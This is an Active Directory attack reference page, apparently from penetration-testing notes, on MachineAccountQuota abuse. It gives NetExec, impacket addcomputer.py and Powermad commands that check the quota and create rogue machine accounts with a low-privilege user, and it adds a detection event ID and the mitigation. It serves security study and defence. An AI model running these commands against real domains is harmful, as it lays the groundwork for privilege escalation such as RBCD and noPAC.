---
title: "Attack #47 — MachineAccountQuota (MAQ) Abuse"
description: "By default, any authenticated domain user can create up to 10 computer accounts (controlled by ms-DS-MachineAccountQuota). These attacker-created machine…"
category: active-directory
subcategory: "Privilege & Group Abuse"
tags: ["active-directory"]
tools: ["NetExec", "PowerShell"]
difficulty: advanced
updated: "2026-08-10"
source: "vault:ActiveDirectory/AD-Attack/Category-Six/🟣 Attack #47 — MachineAccountQuota (MAQ) Abuse.md"
---
# 🟣 Attack #47 — MachineAccountQuota (MAQ) Abuse

***

## 📖 How It Works

By default, any authenticated domain user can create up to **10 computer accounts** (controlled by `ms-DS-MachineAccountQuota`). These attacker-created machine accounts serve as building blocks for other attacks — most notably **RBCD (#17)**, **noPAC (#44)**, and **Certifried (#36)**.

***

## ⚙️ Prerequisites

| Requirement | Detail |
|---|---|
| **Domain user credentials** | Any authenticated user |
| **MAQ > 0** | Default = 10 |

***

## 💻 Full Commands

```bash
# ── Check MAQ value ───────────────────────────────────────────────────────────
nxc ldap DC01.corp.local -u low_user -p 'Password1' -M maq
# Output: MachineAccountQuota: 10

# ── Create machine account ────────────────────────────────────────────────────
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'FakePass!' \
  -dc-ip 10.10.10.10 corp.local/low_user:'Password1'

# ── Delete machine account ────────────────────────────────────────────────────
addcomputer.py -computer-name 'FAKE01$' -computer-pass 'FakePass!' \
  -dc-ip 10.10.10.10 -delete corp.local/low_user:'Password1'
```

```powershell
# ── PowerShell / Powermad ─────────────────────────────────────────────────────
Import-Module .\Powermad.ps1
New-MachineAccount -MachineAccount FAKE01 -Password (
  ConvertTo-SecureString 'FakePass!' -AsPlainText -Force
)

# ── Check MAQ ─────────────────────────────────────────────────────────────────
Get-ADObject -Identity "DC=corp,DC=local" -Properties ms-DS-MachineAccountQuota |
  Select ms-DS-MachineAccountQuota
```

***

## 🛡️ Detection — Event IDs

| Event ID | Source | What to Look For |
|---|---|---|
| **4741** | Security Log (DC) | Computer account created by non-admin user |

***

## 🔗 Attack Chain Context

```
[MAQ Abuse] ──→ Create machine accounts for RBCD, noPAC, Certifried
         │
         ├──→ 🔗 RBCD (#17): needs a controlled machine account
         ├──→ 🔗 noPAC (#44): rename machine account to DC name
         ├──→ 🔗 Certifried (#36): change DNS hostname to DC
         └──→ 💀 Defeated by: set MAQ to 0
```

***

> ✅ **Attack #47 — MAQ Abuse complete.**
